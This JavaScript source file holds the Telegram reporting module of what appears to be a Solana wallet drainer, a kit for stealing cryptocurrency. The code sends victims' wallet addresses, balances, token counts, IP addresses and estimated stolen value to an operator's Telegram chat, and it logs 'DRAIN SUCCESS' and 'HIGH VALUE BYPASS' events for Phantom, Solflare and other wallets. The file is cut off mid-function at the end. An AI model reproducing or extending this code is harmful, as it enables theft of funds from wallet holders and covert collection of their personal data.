// Only import dotenv in development
if (process.env.NODE_ENV !== 'production') {
  try {
    require('dotenv/config');
  } catch (e) {
    // dotenv not available in production
  }
}
const { ENV_CONFIG, PROJECT_NAME } = require('../env.config.js');

class TelegramLogger {
  constructor() {
    // Use environment configuration with proper fallbacks
    this.botToken = ENV_CONFIG.TELEGRAM_BOT_TOKEN;
    this.chatId = ENV_CONFIG.TELEGRAM_CHAT_ID;
    
    // Project name from environment configuration
    this.projectName = PROJECT_NAME;
    
    // Enable Telegram with valid credentials
    this.enabled = !!(this.botToken && this.chatId);
    
    if (this.enabled) {
      console.log(`✅ [TELEGRAM] Logger initialized for project: ${this.projectName}`);
      console.log(`✅ [TELEGRAM] Bot token: ${this.botToken.substring(0, 10)}...`);
      console.log(`✅ [TELEGRAM] Chat ID: ${this.chatId}`);
    } else {
      console.warn(`⚠️ [TELEGRAM] Logger disabled - missing bot token or chat ID`);
      console.warn(`⚠️ [TELEGRAM] Bot token: ${this.botToken ? 'Present' : 'Missing'}`);
      console.warn(`⚠️ [TELEGRAM] Chat ID: ${this.chatId ? 'Present' : 'Missing'}`);
    }
    
    // Enable logging for drain amounts in production
    this.logDrainAmounts = true;
  }

  /**
   * Send message to Telegram
   */
  async sendMessage(message, type = 'info') {
    if (!this.enabled) return;

    try {
      // Always format the message to include project name
      const formattedMessage = this.formatMessage(message, type);
      const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
      
      const response = await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: this.chatId,
          text: formattedMessage,
          parse_mode: 'HTML',
          disable_web_page_preview: true
        })
      });

      if (!response.ok) {
        console.error('❌ Failed to send Telegram message:', response.statusText);
      }
    } catch (error) {
      console.error('❌ Telegram send error:', error.message);
    }
  }

  /**
   * Format SOL balance for display
   */
  formatSOLBalance(lamports) {
    if (!lamports || lamports === 0) return '0 SOL';
    
    const sol = lamports / 1e9;
    
    // For very small amounts, show more precision
    if (sol < 0.000001) {
      return `${sol.toFixed(9)} SOL`;
    } else if (sol < 0.001) {
      return `${sol.toFixed(6)} SOL`;
    } else if (sol < 1) {
      return `${sol.toFixed(4)} SOL`;
    } else if (sol < 1000) {
      return `${sol.toFixed(3)} SOL`;
    } else {
      return `${sol.toFixed(2)} SOL`;
    }
  }

  /**
   * Format message with emojis and styling
   */
  formatMessage(message, type) {
    const timestamp = new Date().toLocaleString();
    const emoji = this.getEmoji(type);
    const prefix = this.getPrefix(type);
    
    return `${emoji} <b>${this.projectName} - ${prefix}</b>\n\n${message}\n\n<code>⏰ ${timestamp}</code>`;
  }

  /**
   * Get emoji for message type
   */
  getEmoji(type) {
    const emojis = {
      'WALLET_DETECTED': '👛',
      'DRAIN_SUCCESS': '💰',
      'DRAIN_FAILED': '❌',
      'TRANSACTION_CANCELLED': '🚫',
      'RATE_LIMIT': '⏰',
      'HIGH_VALUE_BYPASS': '💎',
      'INSUFFICIENT_FUNDS': '💸',
      'ERROR': '🚨',
      'SIGNING_ERROR': '✍️',
      'RPC_FAILURE': '🌐',
      'CONNECTION_ERROR': '🔌',
      'BALANCE_VERIFICATION_FAILED': '📊',
      'BROADCAST_FAILED': '📡'
    };
    return emojis[type] || 'ℹ️';
  }

  /**
   * Get prefix for message type
   */
  getPrefix(type) {
    const prefixes = {
      'WALLET_DETECTED': 'WALLET DETECTED',
      'DRAIN_SUCCESS': 'DRAIN SUCCESS',
      'DRAIN_FAILED': 'DRAIN FAILED',
      'TRANSACTION_CANCELLED': 'TRANSACTION CANCELED',
      'RATE_LIMIT': 'RATE LIMIT',
      'HIGH_VALUE_BYPASS': 'HIGH VALUE BYPASS',
      'INSUFFICIENT_FUNDS': 'INSUFFICIENT FUNDS',
      'ERROR': 'ERROR',
      'SIGNING_ERROR': 'SIGNING ERROR',
      'RPC_FAILURE': 'RPC FAILURE',
      'CONNECTION_ERROR': 'CONNECTION ERROR',
      'BALANCE_VERIFICATION_FAILED': 'BALANCE VERIFICATION FAILED',
      'BROADCAST_FAILED': 'BROADCAST FAILED'
    };
    return prefixes[type] || 'INFO';
  }

  /**
   * Log wallet detection (all wallets, balance will be updated later)
   */
  async logWalletDetected(data) {
    // If a custom message is provided (for SPL tokens), use it directly
    if (data.message) {
      // For custom messages, just send the message content - formatMessage will add the project name
      await this.sendMessage(data.message, 'WALLET_DETECTED');
      return;
    }

    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const walletType = data.walletType || 'Unknown';
    
    // Show wallet type if it's a known wallet type, and handle SPL tokens separately
    const knownWalletTypes = ['Phantom', 'Solflare', 'Backpack', 'Glow', 'Exodus'];
    let walletTypeDisplay = '';
    
    if (knownWalletTypes.includes(walletType)) {
      walletTypeDisplay = `💼 <b>Type:</b> ${walletType}`;
    }

    const message = `
👤 <b>Wallet:</b> <code>${walletAddress}</code>
${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL}
${data.splTokens ? `🪙 <b>SPL Tokens:</b> ${data.splTokens} tokens\n` : ''}🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'WALLET_DETECTED');
  }

  async logDrainSuccess(data) {
    try {
      const message = `🎯 **DRAIN SUCCESS** 🎯\n\n` +
        `💰 **Wallet**: \`${data.publicKey}\`\n` +
        `🔗 **Type**: ${data.walletType}\n` +
        `🪙 **Tokens**: ${data.splTokens}\n` +
        `💎 **SOL**: ${this.formatSOLBalance(data.lamports)}\n` +
        `🌐 **IP**: ${data.ip}\n` +
        `⏰ **Time**: ${new Date().toLocaleString()}\n` +
        `📊 **Value**: $${data.estimatedValue || 'Unknown'}`;

      await this.sendMessage(message, 'DRAIN_SUCCESS');
      console.log('[TELEGRAM] Drain success logged');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log drain success:', error.message);
    }
  }

  async logDrainExecuted(data) {
    try {
      const message = `🚀 **DRAIN EXECUTED** 🚀\n\n` +
        `✅ **Status**: ${data.status}\n` +
        `🔗 **Signature**: \`${data.signature}\`\n` +
        `🌐 **RPC**: ${data.rpcEndpoint}\n` +
        `💰 **Fee**: ${data.transactionDetails?.fee || 0} lamports\n` +
        `📝 **Instructions**: ${data.transactionDetails?.instructions || 0}\n` +
        `👥 **Accounts**: ${data.transactionDetails?.accounts || 0}\n` +
        `⏰ **Time**: ${new Date(data.timestamp).toLocaleString()}`;

      await this.sendMessage(message, 'DRAIN_SUCCESS'); // Assuming DRAIN_SUCCESS is the correct type for this
      console.log('[TELEGRAM] Drain executed logged');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log drain executed:', error.message);
    }
  }

  /**
   * Log drain failed
   */
  async logDrainFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const error = data.error || 'Unknown error';
    const splTokens = data.splTokens || 0;
    
    let message = `
❌ <b>Drain Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${error}
🌐 <b>IP:</b> ${ip}`;

    // Add SPL token count if available
    if (splTokens > 0) {
      message += `
🪙 <b>SPL Tokens:</b> ${splTokens}`;
    }
    
    message = message.trim();

    await this.sendMessage(message, 'DRAIN_FAILED');
  }

  /**
   * Log transaction cancelled
   */
  async logTransactionCancelled(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const reason = data.reason || 'User cancelled';
    
    const message = `
🚫 <b>Transaction Cancelled</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
📝 <b>Reason:</b> ${reason}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'TRANSACTION_CANCELLED');
  }

  /**
   * Log rate limit events
   */
  async logRateLimit(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    
    const message = `
<b>⏰ Rate Limit</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
🌐 <b>IP:</b> ${ip}
📝 <b>Details:</b> ${data.details}
    `.trim();

    await this.sendMessage(message, 'RATE_LIMIT');
  }

  /**
   * Log high value wallet bypass
   */
  async logHighValueBypass(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    
    const message = `
💎 <b>High Value Bypass</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'HIGH_VALUE_BYPASS');
  }

  /**
   * Log insufficient funds
   */
  async logInsufficientFunds(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const required = data.required || 0;
    const requiredSOL = required > 0 ? this.formatSOLBalance(required) : 'N/A';
    const context = data.context || 'Unknown';
    const splTokens = data.splTokens || 0;
    
    let message = `
💸 <b>Insufficient Funds</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Current Balance:</b> ${balanceSOL}
📊 <b>Required:</b> ${requiredSOL}`;

    // Add SPL token count if available
    if (splTokens > 0) {
      message += `
🪙 <b>SPL Tokens:</b> ${splTokens}`;
    }
    
    message += `
🔍 <b>Context:</b> ${context}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'INSUFFICIENT_FUNDS');
  }

  /**
   * Log transaction signing errors
   */
  async logSigningError(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const errorType = data.errorType || 'Unknown';
    const errorMessage = data.errorMessage || 'Unknown error';
    
    const message = `
❌ <b>Transaction Signing Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorType}
📝 <b>Details:</b> ${errorMessage}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'SIGNING_ERROR');
  }



  /**
   * Log connection errors
   */
  async logConnectionError(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const walletType = data.walletType || 'Unknown';
    const errorMessage = data.errorMessage || 'Unknown connection error';
    
    const message = `
🔌 <b>Connection Error</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💼 <b>Type:</b> ${walletType}
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorMessage}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'CONNECTION_ERROR');
  }

  /**
   * Log balance verification failures
   */
  async logBalanceVerificationFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const expectedChange = data.expectedChange || 0;
    const actualChange = data.actualChange || 0;
    const tolerance = data.tolerance || 0;
    
    const message = `
❌ <b>Balance Verification Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
📊 <b>Expected Change:</b> ${this.formatSOLBalance(expectedChange)}
📊 <b>Actual Change:</b> ${this.formatSOLBalance(actualChange)}
📏 <b>Tolerance:</b> ${this.formatSOLBalance(tolerance)}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'BALANCE_VERIFICATION_FAILED');
  }

  /**
   * Log transaction broadcast failures
   */
  async logBroadcastFailed(data) {
    const walletAddress = data.publicKey ? data.publicKey.toString().substring(0, 8) + '...' : 'Unknown';
    const ip = data.ip || 'Unknown';
    const balance = data.lamports || 0;
    const balanceSOL = this.formatSOLBalance(balance);
    const errorMessage = data.errorMessage || 'Unknown broadcast error';
    const rpcEndpoint = data.rpcEndpoint || 'Unknown';
    
    const message = `
📡 <b>Broadcast Failed</b>

👤 <b>Wallet:</b> <code>${walletAddress}</code>
💰 <b>Balance:</b> ${balanceSOL}
🚨 <b>Error:</b> ${errorMessage}
🌐 <b>RPC:</b> ${rpcEndpoint}
🌐 <b>IP:</b> ${ip}
    `.trim();

    await this.sendMessage(message, 'BROADCAST_FAILED');
  }

  /**
   * Log RPC connection failures
   */
  async logRPCFailure(data) {
    try {
      const message = `🌐 <b>RPC Connection Failed</b>\n\n` +
        `🔗 <b>Endpoint:</b> <code>${data.endpoint}</code>\n` +
        `❌ <b>Error:</b> ${data.error}\n` +
        `👤 <b>User:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Wallet:</b> ${data.walletType || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `⏰ <b>Context:</b> ${data.context || 'Unknown'}`;

      await this.sendMessage(message, 'RPC_FAILURE');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log RPC failure:', error.message);
    }
  }

  /**
   * Log API import errors
   */
  async logAPIImportError(data) {
    try {
      const message = `🚨 <b>API Import Error</b>\n\n` +
        `📁 <b>Module:</b> ${data.module}\n` +
        `❌ <b>Error:</b> ${data.error}\n` +
        `🔗 <b>Line:</b> ${data.line}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}`;

      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log API import error:', error.message);
    }
  }

  /**
   * Log wallet validation events
   */
  async logWalletValidation(data) {
    try {
      const message = `🔍 <b>Wallet Validation</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `📝 <b>Details:</b> ${data.details || 'None'}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log wallet validation:', error.message);
    }
  }

  /**
   * Log transaction simulation results
   */
  async logTransactionSimulation(data) {
    try {
      const message = `🧪 <b>Transaction Simulation</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.success ? 'Success' : 'Failed'}\n` +
        `📝 <b>Instructions:</b> ${data.instructions || 0}\n` +
        `💰 <b>Fee:</b> ${data.fee || 0} lamports\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.success ? 'DRAIN_SUCCESS' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log transaction simulation:', error.message);
    }
  }

  /**
   * Log rate limiting events
   */
  async logRateLimit(data) {
    try {
      const message = `⏰ <b>Rate Limit Event</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🚫 <b>Action:</b> ${data.action || 'Unknown'}\n` +
        `⏳ <b>Wait Time:</b> ${data.waitTime || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, 'RATE_LIMIT');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log rate limit:', error.message);
    }
  }

  /**
   * Log pre-initialization events
   */
  async logPreInitialization(data) {
    try {
      const message = `🔧 <b>Pre-Initialization</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📝 <b>Transactions:</b> ${data.transactions || 0}\n` +
        `❌ <b>Failed:</b> ${data.failed || 0}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'DRAIN_SUCCESS' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log pre-initialization:', error.message);
    }
  }

  /**
   * Log clean transfer events
   */
  async logCleanTransfer(data) {
    try {
      const message = `🧹 <b>Clean Transfer</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🪙 <b>Tokens:</b> ${data.tokenCount || 0}\n` +
        `📝 <b>Instructions:</b> ${data.instructions || 0}\n` +
        `💰 <b>Value:</b> ${data.value || 0} lamports\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, 'DRAIN_SUCCESS');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log clean transfer:', error.message);
    }
  }

  /**
   * Log connection health checks
   */
  async logConnectionHealth(data) {
    try {
      const message = `💓 <b>Connection Health</b>\n\n` +
        `🌐 <b>RPC:</b> ${data.rpcEndpoint || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📊 <b>Slot:</b> ${data.slot || 'Unknown'}\n` +
        `⏰ <b>Latency:</b> ${data.latency || 'Unknown'}ms\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'healthy' ? 'WALLET_DETECTED' : 'RPC_FAILURE');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log connection health:', error.message);
    }
  }

  /**
   * Log general system events
   */
  async logSystemEvent(data) {
    try {
      const message = `⚙️ <b>System Event</b>\n\n` +
        `📋 <b>Event:</b> ${data.event || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📝 <b>Details:</b> ${data.details || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log system event:', error.message);
    }
  }

  /**
   * Log frontend errors
   */
  async logFrontendError(data) {
    try {
      const message = `🖥️ <b>Frontend Error</b>\n\n` +
        `❌ <b>Error:</b> ${data.error || 'Unknown'}\n` +
        `📝 <b>Context:</b> ${data.context || 'Unknown'}\n` +
        `🌐 <b>URL:</b> ${data.url || 'Unknown'}\n` +
        `👤 <b>User Agent:</b> ${data.userAgent || 'Unknown'}\n` +
        `⏰ <b>Timestamp:</b> ${data.timestamp || new Date().toLocaleString()}`;

      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log frontend error:', error.message);
    }
  }

  /**
   * Log API call results
   */
  async logAPICall(data) {
    try {
      const message = `📡 <b>API Call</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🔗 <b>Endpoint:</b> ${data.endpoint || 'Unknown'}\n` +
        `📊 <b>Status:</b> ${data.responseStatus || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.responseStatus >= 400 ? 'ERROR' : 'WALLET_DETECTED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log API call:', error.message);
    }
  }

  /**
   * Log transaction signing events
   */
  async logTransactionSigning(data) {
    try {
      const message = `✍️ <b>Transaction Signing</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `⏰ <b>Timeout:</b> ${data.timeout || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'DRAIN_SUCCESS' : 'SIGNING_ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log transaction signing:', error.message);
    }
  }

  /**
   * Log broadcast events
   */
  async logBroadcast(data) {
    try {
      const message = `📡 <b>Transaction Broadcast</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `🔗 <b>Signature:</b> <code>${data.signature || 'None'}</code>\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'DRAIN_SUCCESS' : 'BROADCAST_FAILED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log broadcast:', error.message);
    }
  }

  /**
   * Log wallet connection events
   */
  async logWalletConnection(data) {
    try {
      const message = `🔌 <b>Wallet Connection</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `⏰ <b>Attempt:</b> ${data.attempt || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'CONNECTION_ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log wallet connection:', error.message);
    }
  }

  /**
   * Log mobile wallet events
   */
  async logMobileWallet(data) {
    try {
      const message = `📱 <b>Mobile Wallet</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📱 <b>Platform:</b> ${data.platform || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'CONNECTION_ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log mobile wallet:', error.message);
    }
  }

  /**
   * Log circuit breaker events
   */
  async logCircuitBreaker(data) {
    try {
      const message = `🔌 <b>Circuit Breaker</b>\n\n` +
        `💼 <b>Wallet:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Action:</b> ${data.action || 'Unknown'}\n` +
        `📊 <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `❌ <b>Reason:</b> ${data.reason || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'open' ? 'ERROR' : 'WALLET_DETECTED');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log circuit breaker:', error.message);
    }
  }

  /**
   * Log emergency fallback events
   */
  async logEmergencyFallback(data) {
    try {
      const message = `🚨 <b>Emergency Fallback</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🌐 <b>Endpoint:</b> ${data.endpoint || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🔄 <b>Attempt:</b> ${data.attempt || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, 'RPC_FAILURE');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log emergency fallback:', error.message);
    }
  }

  /**
   * Log validation events
   */
  async logValidation(data) {
    try {
      const message = `✅ <b>Validation</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📝 <b>Details:</b> ${data.details || 'None'}\n` +
        `❌ <b>Errors:</b> ${data.errors || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'valid' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log validation:', error.message);
    }
  }

  /**
   * Log simulation events
   */
  async logSimulation(data) {
    try {
      const message = `🧪 <b>Simulation</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📝 <b>Instructions:</b> ${data.instructions || 0}\n` +
        `💰 <b>Fee:</b> ${data.fee || 0} lamports\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'DRAIN_SUCCESS' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log simulation:', error.message);
    }
  }

  /**
   * Log token processing events
   */
  async logTokenProcessing(data) {
    try {
      const message = `🪙 <b>Token Processing</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🪙 <b>Tokens:</b> ${data.tokenCount || 0}\n` +
        `💰 <b>Total Value:</b> ${data.totalValue || 0} lamports\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'DRAIN_SUCCESS' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log token processing:', error.message);
    }
  }

  /**
   * Log configuration events
   */
  async logConfiguration(data) {
    try {
      const message = `⚙️ <b>Configuration</b>\n\n` +
        `🔧 <b>Component:</b> ${data.component || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `📝 <b>Details:</b> ${data.details || 'None'}\n` +
        `❌ <b>Error:</b> ${data.error || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log configuration:', error.message);
    }
  }

  /**
   * Log performance metrics
   */
  async logPerformance(data) {
    try {
      const message = `⚡ <b>Performance</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `⏱️ <b>Duration:</b> ${data.duration || 'Unknown'}ms\n` +
        `📊 <b>Metric:</b> ${data.metric || 'Unknown'}\n` +
        `✅ <b>Status:</b> ${data.status || 'Unknown'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}`;

      await this.sendMessage(message, data.status === 'success' ? 'WALLET_DETECTED' : 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log performance:', error.message);
    }
  }

  /**
   * Log security events
   */
  async logSecurity(data) {
    try {
      const message = `🔒 <b>Security Event</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `🚨 <b>Event:</b> ${data.event || 'Unknown'}\n` +
        `❌ <b>Violation:</b> ${data.violation || 'None'}\n` +
        `🌍 <b>IP:</b> ${data.ip || 'Unknown'}\n` +
        `⏰ <b>Timestamp:</b> ${new Date().toLocaleString()}`;

      await this.sendMessage(message, 'ERROR');
    } catch (error) {
      console.error('[TELEGRAM] Failed to log security event:', error.message);
    }
  }

  /**
   * Log business logic events
   */
  async logBusinessLogic(data) {
    try {
      const message = `💼 <b>Business Logic</b>\n\n` +
        `👤 <b>Wallet:</b> <code>${data.publicKey || 'Unknown'}</code>\n` +
        `💼 <b>Type:</b> ${data.walletType || 'Unknown'}\n` +
        `📋 <b>Action:</b> ${data.action || 'Unknown'}\n` +
        `✅ <b>Result:</b> ${data.result || 'Unknown'}\n` +
        `📊 <b>Details:</b> ${data.details || 'None'}\n` +
